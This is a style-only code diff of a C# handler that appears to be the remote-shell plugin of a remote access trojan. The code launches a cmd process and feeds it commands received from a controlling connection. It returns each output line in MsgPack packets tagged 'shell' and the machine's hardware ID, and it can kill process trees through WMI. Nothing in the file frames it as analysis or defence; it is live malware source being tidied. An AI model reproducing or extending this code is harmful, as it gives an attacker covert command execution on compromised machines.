@@ -1,13 +1,11 @@
-﻿using Plugin;
-using MessagePackLib.MessagePack;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Management;
 using System.Text;
 using System.Threading;
+using MessagePackLib.MessagePack;
+using Plugin;
 
 namespace Miscellaneous.Handler
 {
@@ -25,7 +23,7 @@ namespace Miscellaneous.Handler
 
         public static void StarShell()
         {
-            ProcessShell = new Process()
+            ProcessShell = new Process
             {
                 StartInfo = new ProcessStartInfo("cmd")
                 {
@@ -47,32 +45,30 @@ namespace Miscellaneous.Handler
                 Thread.Sleep(1);
                 if (CanWrite)
                 {
-                    if (Input.ToLower() == "exit")
-                    {
-                        break;
-                    }
+                    if (Input.ToLower() == "exit") break;
                     ProcessShell.StandardInput.WriteLine(Input);
                     CanWrite = false;
                 }
             }
 
             ShellClose();
-            return;
         }
 
         private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
         {
-            StringBuilder Output = new StringBuilder();
+            var Output = new StringBuilder();
             try
             {
                 Output.AppendLine(e.Data);
-                MsgPack msgpack = new MsgPack();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "shell";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("ReadInput").AsString = Output.ToString();
                 Connection.Send(msgpack.Encode2Bytes());
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         public static void ShellClose()
@@ -87,30 +83,28 @@ namespace Miscellaneous.Handler
                     CanWrite = false;
                 }
             }
-            catch { }
+            catch
+            {
+            }
+
             Connection.Disconnected();
         }
 
         private static void KillProcessAndChildren(int pid)
         {
-            if (pid == 0)
-            {
-                return;
-            }
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher
-                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
-            ManagementObjectCollection moc = searcher.Get();
-            foreach (ManagementObject mo in moc)
-            {
-                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
-            }
+            if (pid == 0) return;
+            var searcher = new ManagementObjectSearcher
+                ("Select * From Win32_Process Where ParentProcessID=" + pid);
+            var moc = searcher.Get();
+            foreach (ManagementObject mo in moc) KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
             try
             {
-                Process proc = Process.GetProcessById(pid);
+                var proc = Process.GetProcessById(pid);
                 proc.Kill();
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
-
 }
